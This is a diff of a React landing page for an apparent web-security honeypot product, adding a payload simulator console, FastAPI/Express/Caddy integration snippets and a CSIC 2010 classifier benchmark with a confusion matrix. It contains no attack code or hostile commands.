+                        color: isActive ? "#38bdf8" : "rgba(255, 255, 255, 0.4)",
+                      }}
+                    >
+                      {st.title}
+                    </div>
+                    <div style={{ fontSize: 10, color: "rgba(255, 255, 255, 0.5)", fontFamily: "'Fira Code', monospace" }}>
+                      {st.detail}
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+
+            {/* Results Inspection Console */}
+            <div
+              style={{
+                borderRadius: 16,
+                background: "rgba(10, 16, 32, 0.8)",
+                border: "1px solid rgba(0, 240, 255, 0.25)",
+                padding: "20px 24px",
+                fontFamily: "'Fira Code', monospace",
+                fontSize: 12,
+                color: "#e2e8f0",
+                display: "grid",
+                gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))",
+                gap: 20,
+              }}
+            >
+              <div>
+                <div style={{ color: "rgba(0, 240, 255, 0.7)", fontSize: 11, marginBottom: 6, fontWeight: 700 }}>
+                  [ INGRESS TRAFFIC PACKET ]
+                </div>
+                <div
+                  style={{
+                    background: "rgba(0, 0, 0, 0.6)",
+                    padding: "12px",
+                    borderRadius: 10,
+                    border: "1px solid rgba(255, 255, 255, 0.1)",
+                    color: "#38bdf8",
+                    wordBreak: "break-all",
+                    marginBottom: 12,
+                  }}
+                >
+                  {attackPresets[simulatorPayload].payload}
+                </div>
+                <div style={{ display: "flex", gap: 16, fontSize: 11 }}>
+                  <div>
+                    <span style={{ color: "rgba(255, 255, 255, 0.5)" }}>SHANNON ENTROPY: </span>
+                    <span style={{ color: "#22c55e", fontWeight: 700 }}>{simResult.entropy} bits</span>
+                  </div>
+                  <div>
+                    <span style={{ color: "rgba(255, 255, 255, 0.5)" }}>LATENCY: </span>
+                    <span style={{ color: "#22c55e", fontWeight: 700 }}>{simResult.latency}</span>
+                  </div>
+                </div>
               </div>
-              <div style={{ fontSize: 24, fontWeight: 700, color: T.text, marginBottom: 10, fontFamily: "monospace" }}>
-                {p.price}
+
+              <div>
+                <div style={{ color: "rgba(0, 240, 255, 0.7)", fontSize: 11, marginBottom: 6, fontWeight: 700 }}>
+                  [ DECISION MATRIX & ACTION ]
+                </div>
+                <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
+                  <div
+                    style={{
+                      fontSize: 22,
+                      fontWeight: 900,
+                      fontFamily: "'Inter', sans-serif",
+                      color: simResult.score > 80 ? "#ef4444" : "#22c55e",
+                      
+                    }}
+                  >
+                    SCORE {simResult.score}/100
+                  </div>
+                  <span
+                    style={{
+                      fontSize: 10,
+                      fontWeight: 800,
+                      padding: "4px 10px",
+                      borderRadius: 12,
+                      background: simResult.score > 80 ? "rgba(255, 0, 127, 0.2)" : "rgba(57, 255, 20, 0.2)",
+                      color: simResult.score > 80 ? "#ef4444" : "#22c55e",
+                      border: `1px solid ${simResult.score > 80 ? "#ef4444" : "#22c55e"}`,
+                    }}
+                  >
+                    {simResult.verdict}
+                  </span>
+                </div>
+                <div style={{ fontSize: 11, color: "rgba(255, 255, 255, 0.8)", marginBottom: 8 }}>
+                  <strong>MITRE ATT&CK: </strong>
+                  <span style={{ color: "#a855f7" }}>{simResult.mitre}</span>
+                </div>
+                <div style={{ fontSize: 11, color: "rgba(255, 255, 255, 0.65)", lineHeight: 1.5 }}>
+                  {attackPresets[simulatorPayload].actionDesc}
+                </div>
               </div>
-              <div style={{ color: T.muted, fontSize: 12, lineHeight: 1.7, marginBottom: 16 }}>{p.desc}</div>
-              <Btn primary={p.primary} small style={{ width: "100%", justifyContent: "center" }} onClick={() => onNav("login")}>
-                {p.cta}
-              </Btn>
-            </Card>
+            </div>
+          </div>
+        </div>
+
+        {/* ── Interactive Code Terminal (Syntax Highlighted) ── */}
+        <div
+          id="architecture"
+          style={{
+            maxWidth: 820,
+            margin: "0 auto",
+            borderRadius: 22,
+            backdropFilter: "blur(24px) saturate(180%)",
+            WebkitBackdropFilter: "blur(24px) saturate(180%)",
+            background: "rgba(10, 15, 28, 0.78)",
+            border: "1px solid rgba(0, 240, 255, 0.4)",
+            boxShadow: "0 10px 30px rgba(0, 0, 0, 0.4)",
+            overflow: "hidden",
+            textAlign: "left",
+          }}
+        >
+          {/* Terminal Titlebar */}
+          <div
+            style={{
+              padding: "14px 22px",
+              background: "rgba(0, 0, 0, 0.5)",
+              borderBottom: "1px solid rgba(0, 240, 255, 0.25)",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "space-between",
+              flexWrap: "wrap",
+              gap: 10,
+            }}
+          >
+            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+              <span style={{ width: 11, height: 11, borderRadius: "50%", background: "#ff5f56", display: "inline-block" }} />
+              <span style={{ width: 11, height: 11, borderRadius: "50%", background: "#ffbd2e", display: "inline-block" }} />
+              <span style={{ width: 11, height: 11, borderRadius: "50%", background: "#27c93f", display: "inline-block" }} />
+              <span style={{ marginLeft: 10, fontFamily: "'Fira Code', monospace", fontSize: 12, color: "#38bdf8", fontWeight: 700 }}>
+                guardian-edge-integration // 3-line inline guard
+              </span>
+            </div>
+
+            {/* Language Switcher Tabs */}
+            <div style={{ display: "flex", gap: 6 }}>
+              {[
+                { id: "fastapi", label: "Python (FastAPI)" },
+                { id: "express", label: "Node.js (Express)" },
+                { id: "caddy", label: "Caddy / Edge Proxy" },
+              ].map((tab) => (
+                <button
+                  key={tab.id}
+                  onClick={() => {
+                    playClickSound();
+                    setActiveTab(tab.id);
+                  }}
+                  style={{
+                    padding: "5px 12px",
+                    borderRadius: 14,
+                    border: activeTab === tab.id ? "1px solid #38bdf8" : "1px solid transparent",
+                    background: activeTab === tab.id ? "rgba(0, 240, 255, 0.2)" : "transparent",
+                    color: activeTab === tab.id ? "#38bdf8" : "rgba(255, 255, 255, 0.55)",
+                    fontSize: 11,
+                    fontFamily: "'Fira Code', monospace",
+                    cursor: "pointer",
+                    transition: "all 0.2s",
+                  }}
+                >
+                  {tab.label}
+                </button>
+              ))}
+              <button
+                onClick={() => {
+                  const texts = {
+                    fastapi: `pip install cyber-guardian\nfrom fastapi import FastAPI\nfrom cyber_guardian import GuardianMiddleware\napp = FastAPI()\napp.add_middleware(GuardianMiddleware, honeypot_divert=True)`,
+                    express: `npm install @cyber-guardian/sdk\nconst express = require('express');\nconst { guardianGuard } = require('@cyber-guardian/sdk');\napp.use(guardianGuard({ silentHoneypot: true }));`,
+                    caddy: `reverse_proxy @malicious http://127.0.0.1:8000/honeypot\nreverse_proxy http://127.0.0.1:5000`
+                  };
+                  copyCode(texts[activeTab]);
+                }}
+                style={{
+                  marginLeft: 8,
+                  padding: "5px 12px",
+                  borderRadius: 14,
+                  background: copied ? "rgba(57, 255, 20, 0.25)" : "rgba(255, 255, 255, 0.08)",
+                  border: copied ? "1px solid #22c55e" : "1px solid rgba(255, 255, 255, 0.2)",
+                  color: copied ? "#22c55e" : "rgba(255, 255, 255, 0.85)",
+                  fontSize: 11,
+                  fontFamily: "'Fira Code', monospace",
+                  cursor: "pointer",
+                }}
+              >
+                {copied ? "✓ COPIED" : "COPY CODE"}
+              </button>
+            </div>
+          </div>
+
+          {/* Terminal Body with Syntax Color */}
+          <div
+            style={{
+              margin: 0,
+              padding: "24px 28px",
+              fontFamily: "'Fira Code', monospace",
+              fontSize: 13,
+              lineHeight: 1.7,
+              background: "rgba(5, 8, 18, 0.88)",
+              overflowX: "auto",
+            }}
+          >
+            {activeTab === "fastapi" && (
+              <div>
+                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># 1. Install production pip package</div>
+                <div style={{ color: "#f87171" }}>$ pip install cyber-guardian</div>
+                <br />
+                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># 2. Add sub-millisecond AI middleware</div>
+                <div>
+                  <span style={{ color: "#ef4444" }}>from</span> <span style={{ color: "#38bdf8" }}>fastapi</span> <span style={{ color: "#ef4444" }}>import</span> FastAPI
+                </div>
+                <div>
+                  <span style={{ color: "#ef4444" }}>from</span> <span style={{ color: "#38bdf8" }}>cyber_guardian</span> <span style={{ color: "#ef4444" }}>import</span> GuardianMiddleware
+                </div>
+                <br />
+                <div>app = FastAPI(title=<span style={{ color: "#22c55e" }}>"Production Gateway"</span>)</div>
+                <br />
+                <div>app.add_middleware(</div>
+                <div style={{ paddingLeft: 20 }}>
+                  GuardianMiddleware,<br />
+                  api_key=<span style={{ color: "#22c55e" }}>"cg_live_98a72b4f9810a"</span>,<br />
+                  honeypot_divert=<span style={{ color: "#ffaa00" }}>True</span>, <span style={{ color: "rgba(0, 240, 255, 0.5)" }}># In-Memory VFS sandbox</span><br />
+                  threshold=<span style={{ color: "#ffaa00" }}>85</span> <span style={{ color: "rgba(0, 240, 255, 0.5)" }}># Dual AI Trigger Score</span>
+                </div>
+                <div>)</div>
+              </div>
+            )}
+
+            {activeTab === "express" && (
+              <div>
+                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}>// 1. Install Node.js SDK</div>
+                <div style={{ color: "#f87171" }}>$ npm install @cyber-guardian/sdk</div>
+                <br />
+                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}>// 2. Wrap Express router in 2 lines</div>
+                <div>
+                  <span style={{ color: "#ef4444" }}>const</span> express = <span style={{ color: "#38bdf8" }}>require</span>(<span style={{ color: "#22c55e" }}>'express'</span>);
+                </div>
+                <div>
+                  <span style={{ color: "#ef4444" }}>const</span> &#123; guardianGuard &#125; = <span style={{ color: "#38bdf8" }}>require</span>(<span style={{ color: "#22c55e" }}>'@cyber-guardian/sdk'</span>);
+                </div>
+                <br />
+                <div><span style={{ color: "#ef4444" }}>const</span> app = express();</div>
+                <br />
+                <div>app.use(guardianGuard(&#123;</div>
+                <div style={{ paddingLeft: 20 }}>
+                  apiKey: process.env.GUARDIAN_API_KEY,<br />
+                  silentHoneypot: <span style={{ color: "#ffaa00" }}>true</span>,<br />
+                  maxAllowedLatency: <span style={{ color: "#ffaa00" }}>3.5</span> <span style={{ color: "rgba(0, 240, 255, 0.5)" }}>// SLA milliseconds</span>
+                </div>
+                <div>&#125;));</div>
+              </div>
+            )}
+
+            {activeTab === "caddy" && (
+              <div>
+                <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># Caddyfile / Nginx Edge Reverse Proxy Mode</div>
+                <div>api.enterprise.domain &#123;</div>
+                <div style={{ paddingLeft: 20 }}>
+                  <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># Inline Guardian L7 Decision Engine</div>
+                  forward_auth http://127.0.0.1:8000/api/decisions &#123;<br />
+                  &nbsp;&nbsp;uri /v1/evaluate<br />
+                  &nbsp;&nbsp;copy_headers X-Guardian-Score X-Guardian-Tier<br />
+                  &#125;<br /><br />
+                  <div style={{ color: "rgba(0, 240, 255, 0.5)" }}># Clean traffic routes to backend; Exploits route to in-memory Honeypot</div>
+                  reverse_proxy @malicious http://127.0.0.1:8000/honeypot<br />
+                  reverse_proxy http://127.0.0.1:5000
+                </div>
+                <div>&#125;</div>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+
+      {/* ── Engine Benchmark & Validation Strip ── */}
+      <div
+        id="metrics"
+        style={{
+          position: "relative",
+          zIndex: 2,
+          borderTop: "1px solid rgba(255, 255, 255, 0.08)",
+          borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
+          padding: "48px 24px",
+          background: "#090d16",
+        }}
+      >
+        {/* 5 KPI Metric Cards */}
+        <div
+          style={{
+            maxWidth: 1200,
+            margin: "0 auto",
+            display: "grid",
+            gridTemplateColumns: "repeat(auto-fit, minmax(210px, 1fr))",
+            gap: 16,
+            textAlign: "center",
+          }}
+        >
+          {metrics.map((m) => (
+            <div
+              key={m.label}
+              style={{
+                padding: "20px 16px",
+                borderRadius: 12,
+                background: "rgba(255, 255, 255, 0.02)",
+                border: "1px solid rgba(255, 255, 255, 0.07)",
+                transition: "border-color 0.2s, background 0.2s",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.borderColor = "rgba(56, 189, 248, 0.4)";
+                e.currentTarget.style.background = "rgba(255, 255, 255, 0.04)";
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.borderColor = "rgba(255, 255, 255, 0.07)";
+                e.currentTarget.style.background = "rgba(255, 255, 255, 0.02)";
+              }}
+            >
+              <div
+                style={{
+                  fontSize: 32,
+                  fontWeight: 700,
+                  fontFamily: "'Inter', system-ui, sans-serif",
+                  color: "#ffffff",
+                  letterSpacing: "-0.5px",
+                  marginBottom: 6,
+                }}
+              >
+                {m.val}
+              </div>
+              <div
+                style={{
+                  fontSize: 12,
+                  fontWeight: 600,
+                  fontFamily: "'Inter', sans-serif",
+                  color: "#94a3b8",
+                  letterSpacing: "0.5px",
+                  marginBottom: 4,
+                }}
+              >
+                {m.label}
+              </div>
+              <div style={{ fontSize: 11, color: "#64748b", fontFamily: "'Inter', sans-serif" }}>
+                {m.sub}
+              </div>
+            </div>
+          ))}
+        </div>
+
+        {/* ── Official Benchmark & Mathematical Formulation Card ── */}
+        <div
+          style={{
+            maxWidth: 1200,
+            margin: "32px auto 0",
+            padding: "28px 32px",
+            borderRadius: 14,
+            background: "#0c111d",
+            border: "1px solid rgba(255, 255, 255, 0.08)",
+          }}
+        >
+          {/* Section Header */}
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "space-between",
+              flexWrap: "wrap",
+              gap: 12,
+              marginBottom: 24,
+              borderBottom: "1px solid rgba(255, 255, 255, 0.07)",
+              paddingBottom: 16,
+            }}
+          >
+            <div>
+              <span
+                style={{
+                  display: "inline-block",
+                  padding: "4px 10px",
+                  borderRadius: 6,
+                  fontSize: 11,
+                  fontWeight: 600,
+                  fontFamily: "'Inter', sans-serif",
+                  background: "rgba(56, 189, 248, 0.08)",
+                  color: "#38bdf8",
+                  border: "1px solid rgba(56, 189, 248, 0.2)",
+                  marginBottom: 8,
+                }}
+              >
+                ● CSIC 2010 MODEL VALIDATION DATA
+              </span>
+              <h3
+                style={{
+                  margin: 0,
+                  fontSize: 18,
+                  fontWeight: 700,
+                  fontFamily: "'Inter', sans-serif",
+                  color: "#ffffff",
+                }}
+              >
+                Dual-Tree Threat Classifier Performance
+              </h3>
+            </div>
+            <div
+              style={{
+                fontSize: 12,
+                color: "#94a3b8",
+                fontFamily: "'Inter', sans-serif",
+                background: "rgba(255, 255, 255, 0.03)",
+                padding: "6px 12px",
+                borderRadius: 6,
+                border: "1px solid rgba(255, 255, 255, 0.06)",
+              }}
+            >
+              Test Split: 4,800 HTTP Payloads (2,400 Benign · 2,400 Malicious)
+            </div>
+          </div>
+
+          {/* Two-Column Grid: Left (List + Insights) | Right (Formula & Confusion Matrix) */}
+          <div
+            style={{
+              display: "grid",
+              gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))",
+              gap: 24,
+              alignItems: "stretch",
+            }}
+          >
+            {/* Left: Metric List with Intuitive Explanations */}
+            <div
+              style={{
+                display: "flex",
+                flexDirection: "column",
+                gap: 10,
+                justifyContent: "center",
+              }}
+            >
+              {/* Item 1: Overall Accuracy */}
+              <div
+                style={{
+                  padding: "12px 16px",
+                  borderRadius: 8,
+                  background: "rgba(255, 255, 255, 0.02)",
+                  border: "1px solid rgba(255, 255, 255, 0.06)",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "space-between",
+                }}
+              >
+                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                  <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
+                  <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
+                    Overall Accuracy
+                  </span>
+                </div>
+                <span
+                  style={{
+                    fontSize: 18,
+                    fontWeight: 700,
+                    fontFamily: "'Inter', sans-serif",
+                    color: "#ffffff",
+                  }}
+                >
+                  94.04%
+                </span>
+              </div>
+
+              {/* Item 2: Precision */}
+              <div
+                style={{
+                  padding: "12px 16px",
+                  borderRadius: 8,
+                  background: "rgba(255, 255, 255, 0.02)",
+                  border: "1px solid rgba(255, 255, 255, 0.06)",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "space-between",
+                    marginBottom: 4,
+                  }}
+                >
+                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                    <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
+                    <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
+                      Precision
+                    </span>
+                  </div>
+                  <span
+                    style={{
+                      fontSize: 18,
+                      fontWeight: 700,
+                      fontFamily: "'Inter', sans-serif",
+                      color: "#ffffff",
+                    }}
+                  >
+                    96.24%
+                  </span>
+                </div>
+                <div
+                  style={{
+                    fontSize: 12,
+                    color: "#94a3b8",
+                    paddingLeft: 22,
+                    fontFamily: "'Inter', sans-serif",
+                    fontStyle: "italic",
+                  }}
+                >
+                  (Matlab jab model bolta hai ki "Yeh Attack hai", toh 96.2% time woh bilkul sahi hota hai)
+                </div>
+              </div>
+
+              {/* Item 3: Recall */}
+              <div
+                style={{
+                  padding: "12px 16px",
+                  borderRadius: 8,
+                  background: "rgba(255, 255, 255, 0.02)",
+                  border: "1px solid rgba(255, 255, 255, 0.06)",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "space-between",
+                    marginBottom: 4,
+                  }}
+                >
+                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                    <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
+                    <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
+                      Recall
+                    </span>
+                  </div>
+                  <span
+                    style={{
+                      fontSize: 18,
+                      fontWeight: 700,
+                      fontFamily: "'Inter', sans-serif",
+                      color: "#ffffff",
+                    }}
+                  >
+                    91.67%
+                  </span>
+                </div>
+                <div
+                  style={{
+                    fontSize: 12,
+                    color: "#94a3b8",
+                    paddingLeft: 22,
+                    fontFamily: "'Inter', sans-serif",
+                    fontStyle: "italic",
+                  }}
+                >
+                  (91.7% attacks ko model ne pakda)
+                </div>
+              </div>
+
+              {/* Item 4: False Positive Rate (FPR) */}
+              <div
+                style={{
+                  padding: "12px 16px",
+                  borderRadius: 8,
+                  background: "rgba(255, 255, 255, 0.02)",
+                  border: "1px solid rgba(255, 255, 255, 0.06)",
+                }}
+              >
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "space-between",
+                    marginBottom: 4,
+                  }}
+                >
+                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                    <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
+                    <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
+                      False Positive Rate (FPR)
+                    </span>
+                  </div>
+                  <span
+                    style={{
+                      fontSize: 18,
+                      fontWeight: 700,
+                      fontFamily: "'Inter', sans-serif",
+                      color: "#38bdf8",
+                    }}
+                  >
+                    3.58%
+                  </span>
+                </div>
+                <div
+                  style={{
+                    fontSize: 12,
+                    color: "#94a3b8",
+                    paddingLeft: 22,
+                    fontFamily: "'Inter', sans-serif",
+                    fontStyle: "italic",
+                  }}
+                >
+                  (Sirf 3.5% normal users ko galti se shaq ke dayre me liya, jo industry standard &le; 5% se behtar hai)
+                </div>
+              </div>
+
+              {/* Item 5: F1-Score */}
+              <div
+                style={{
+                  padding: "12px 16px",
+                  borderRadius: 8,
+                  background: "rgba(255, 255, 255, 0.02)",
+                  border: "1px solid rgba(255, 255, 255, 0.06)",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "space-between",
+                }}
+              >
+                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                  <span style={{ color: "#38bdf8", fontSize: 12 }}>●</span>
+                  <span style={{ fontSize: 14, fontWeight: 600, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
+                    F1-Score
+                  </span>
+                </div>
+                <span
+                  style={{
+                    fontSize: 18,
+                    fontWeight: 700,
+                    fontFamily: "'Inter', sans-serif",
+                    color: "#ffffff",
+                  }}
+                >
+                  0.939
+                </span>
+              </div>
+            </div>
+
+            {/* Right: Math Formula & Confusion Matrix Box */}
+            <div
+              style={{
+                display: "flex",
+                flexDirection: "column",
+                gap: 14,
+                justifyContent: "space-between",
+              }}
+            >
+              {/* Mathematical Formulation Card */}
+              <div
+                style={{
+                  padding: "20px",
+                  borderRadius: 10,
+                  background: "rgba(0, 0, 0, 0.35)",
+                  border: "1px solid rgba(255, 255, 255, 0.08)",
+                  display: "flex",
+                  flexDirection: "column",
+                  alignItems: "center",
+                  justifyContent: "center",
+                }}
+              >
+                <div
+                  style={{
+                    fontSize: 11,
+                    fontFamily: "'Inter', sans-serif",
+                    letterSpacing: "0.8px",
+                    color: "#94a3b8",
+                    fontWeight: 600,
+                    marginBottom: 14,
+                  }}
+                >
+                  MATHEMATICAL ACCURACY FORMULATION
+                </div>
+
+                {/* Mathematical Equation Display */}
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "center",
+                    gap: 12,
+                    fontSize: 18,
+                    fontWeight: 600,
+                    color: "#ffffff",
+                    fontFamily: "'Inter', monospace",
+                    flexWrap: "wrap",
+                    justifyContent: "center",
+                  }}
+                >
+                  <span style={{ color: "#38bdf8", fontStyle: "italic" }}>Accuracy</span>
+                  <span style={{ color: "#94a3b8" }}>=</span>
+                  
+                  {/* Fraction 1: (TP + TN) / Total */}
+                  <div style={{ display: "inline-flex", flexDirection: "column", alignItems: "center" }}>
+                    <span style={{ borderBottom: "1px solid rgba(255, 255, 255, 0.4)", paddingBottom: 2, paddingLeft: 6, paddingRight: 6 }}>
+                      TP + TN
+                    </span>
+                    <span style={{ paddingTop: 2, color: "#94a3b8" }}>
+                      Total
+                    </span>
+                  </div>
+
+                  <span style={{ color: "#94a3b8" }}>=</span>
+
+                  {/* Fraction 2: (2200 + 2314) / 4800 */}
+                  <div style={{ display: "inline-flex", flexDirection: "column", alignItems: "center" }}>
+                    <span style={{ borderBottom: "1px solid rgba(255, 255, 255, 0.4)", paddingBottom: 2, paddingLeft: 6, paddingRight: 6, color: "#ffffff" }}>
+                      2200 + 2314
+                    </span>
+                    <span style={{ paddingTop: 2, color: "#94a3b8" }}>
+                      4800
+                    </span>
+                  </div>
+
+                  <span style={{ color: "#94a3b8" }}>&approx;</span>
+                  
+                  <span
+                    style={{
+                      fontSize: 22,
+                      fontWeight: 700,
+                      fontFamily: "'Inter', sans-serif",
+                      color: "#38bdf8",
+                    }}
+                  >
+                    94.04%
+                  </span>
+                </div>
+              </div>
+
+              {/* Confusion Matrix Mini Grid */}
+              <div
+                style={{
+                  padding: "16px 20px",
+                  borderRadius: 10,
+                  background: "rgba(255, 255, 255, 0.02)",
+                  border: "1px solid rgba(255, 255, 255, 0.06)",
+                }}
+              >
+                <div
+                  style={{
+                    fontSize: 11,
+                    fontFamily: "'Inter', sans-serif",
+                    letterSpacing: "0.5px",
+                    color: "#94a3b8",
+                    fontWeight: 600,
+                    marginBottom: 10,
+                    textAlign: "center",
+                  }}
+                >
+                  CONFUSION MATRIX (4,800 SAMPLES)
+                </div>
+                <div
+                  style={{
+                    display: "grid",
+                    gridTemplateColumns: "1fr 1fr",
+                    gap: 8,
+                    textAlign: "center",
+                  }}
+                >
+                  <div
+                    style={{
+                      background: "rgba(255, 255, 255, 0.02)",
+                      border: "1px solid rgba(255, 255, 255, 0.06)",
+                      borderRadius: 8,
+                      padding: "8px 10px",
+                    }}
+                  >
+                    <div style={{ fontSize: 11, color: "#94a3b8" }}>True Positive (TP)</div>
+                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>2,200</div>
+                    <div style={{ fontSize: 10, color: "#38bdf8" }}>Attacks Trapped</div>
+                  </div>
+                  <div
+                    style={{
+                      background: "rgba(255, 255, 255, 0.02)",
+                      border: "1px solid rgba(255, 255, 255, 0.06)",
+                      borderRadius: 8,
+                      padding: "8px 10px",
+                    }}
+                  >
+                    <div style={{ fontSize: 11, color: "#94a3b8" }}>True Negative (TN)</div>
+                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>2,314</div>
+                    <div style={{ fontSize: 10, color: "#94a3b8" }}>Normal Traffic Passed</div>
+                  </div>
+                  <div
+                    style={{
+                      background: "rgba(255, 255, 255, 0.02)",
+                      border: "1px solid rgba(255, 255, 255, 0.06)",
+                      borderRadius: 8,
+                      padding: "8px 10px",
+                    }}
+                  >
+                    <div style={{ fontSize: 11, color: "#94a3b8" }}>False Positive (FP)</div>
+                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>86</div>
+                    <div style={{ fontSize: 10, color: "#94a3b8" }}>3.58% Normal Audited</div>
+                  </div>
+                  <div
+                    style={{
+                      background: "rgba(255, 255, 255, 0.02)",
+                      border: "1px solid rgba(255, 255, 255, 0.06)",
+                      borderRadius: 8,
+                      padding: "8px 10px",
+                    }}
+                  >
+                    <div style={{ fontSize: 11, color: "#94a3b8" }}>False Negative (FN)</div>
+                    <div style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>200</div>
+                    <div style={{ fontSize: 10, color: "#94a3b8" }}>Filtered by Rule Base</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* ── Core Features Section ── */}
+      <div
+        id="features"
+        style={{
+          position: "relative",
+          zIndex: 2,
+          maxWidth: 1200,
+          margin: "90px auto",
+          padding: "0 24px",
+        }}
+      >
+        <div style={{ textAlign: "center", marginBottom: 54 }}>
+          <div
+            style={{
+              fontFamily: "'Inter', sans-serif",
+              color: "#ef4444",
+              fontWeight: 800,
+              fontSize: 12,
+              letterSpacing: "2.5px",
+              marginBottom: 10,
+            }}
+          >
+            ENTERPRISE THREAT MITIGATION
+          </div>
+          <h2
+            style={{
+              fontSize: "clamp(28px, 4vw, 42px)",
+              fontWeight: 900,
+              color: "#ffffff",
+              fontFamily: "'Inter', sans-serif",
+              letterSpacing: "1px",
+              margin: 0,
+            }}
+          >
+            Built for High-Throughput Gateways
+          </h2>
+          <p style={{ color: "rgba(255, 255, 255, 0.7)", fontSize: 15, marginTop: 12, maxWidth: 640, margin: "12px auto 0" }}>
+            Deterministic rule speed meets statistical machine learning depth without adding latency to the transaction path.
+          </p>
+        </div>
+
+        {/* 6 Cyberpunk Feature Cards */}
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(350px, 1fr))", gap: 26 }}>
+          {features.map((f) => (
+            <div
+              key={f.title}
+              style={{
+                borderRadius: 24,
+                padding: "34px 30px",
+                background: "rgba(12, 18, 36, 0.65)",
+                border: "1px solid rgba(0, 240, 255, 0.25)",
+                backdropFilter: "blur(24px) saturate(180%)",
+                WebkitBackdropFilter: "blur(24px) saturate(180%)",
+                boxShadow: "0 15px 35px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(0, 240, 255, 0.05)",
+                transition: "all 0.3s ease",
+                cursor: "pointer",
+                position: "relative",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.transform = "translateY(-6px)";
+                e.currentTarget.style.borderColor = f.color;
+                e.currentTarget.style.boxShadow = `0 25px 50px rgba(0,0,0,0.8), 0 0 30px ${f.color}55`;
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.transform = "translateY(0)";
+                e.currentTarget.style.borderColor = "rgba(0, 240, 255, 0.25)";
+                e.currentTarget.style.boxShadow = "0 15px 35px rgba(0, 0, 0, 0.5), inset 0 0 15px rgba(0, 240, 255, 0.05)";
+              }}
+            >
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
+                <div
+                  style={{
+                    width: 48,
+                    height: 48,
+                    borderRadius: 14,
+                    background: f.accent,
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "center",
+                    border: `1px solid ${f.color}55`,
+                    boxShadow: `0 0 16px ${f.color}33`,
+                  }}
+                >
+                  {f.icon}
+                </div>
+                <span
+                  style={{
+                    fontSize: 10,
+                    fontWeight: 800,
+                    fontFamily: "'Inter', sans-serif",
+                    letterSpacing: "1.2px",
+                    color: f.color,
+                    padding: "4px 10px",
+                    borderRadius: 14,
+                    background: `${f.color}15`,
+                    border: `1px solid ${f.color}44`,
+                  }}
+                >
+                  {f.badge}
+                </span>
+              </div>
+              <h3
+                style={{
+                  fontSize: 19,
+                  fontWeight: 800,
+                  color: "#ffffff",
+                  fontFamily: "'Inter', sans-serif",
+                  marginBottom: 12,
+                  letterSpacing: "0.5px",
+                }}
+              >
+                {f.title}
+              </h3>
+              <p style={{ color: "rgba(255, 255, 255, 0.72)", fontSize: 13, lineHeight: 1.7, margin: 0 }}>
+                {f.desc}
+              </p>
+            </div>
           ))}
         </div>
       </div>
+
+      {/* ── Interactive 3-Stage Deception Flow ── */}
+      <div
+        style={{
+          position: "relative",
+          zIndex: 2,
+          maxWidth: 1200,
+          margin: "90px auto",
+          padding: "44px 34px",
+          borderRadius: 28,
+          background: "rgba(10, 16, 32, 0.72)",
+          border: "1px solid rgba(0, 240, 255, 0.35)",
+          backdropFilter: "blur(26px)",
+          boxShadow: "0 25px 65px rgba(0, 0, 0, 0.75), 0 0 35px rgba(0, 240, 255, 0.18)",
+        }}
+      >
+        <div style={{ textAlign: "center", marginBottom: 40 }}>
+          <span style={{ color: "#22c55e", fontFamily: "'Inter', sans-serif", fontSize: 12, fontWeight: 800, letterSpacing: "2.5px" }}>
+            HOW DECEPTION WORKS
+          </span>
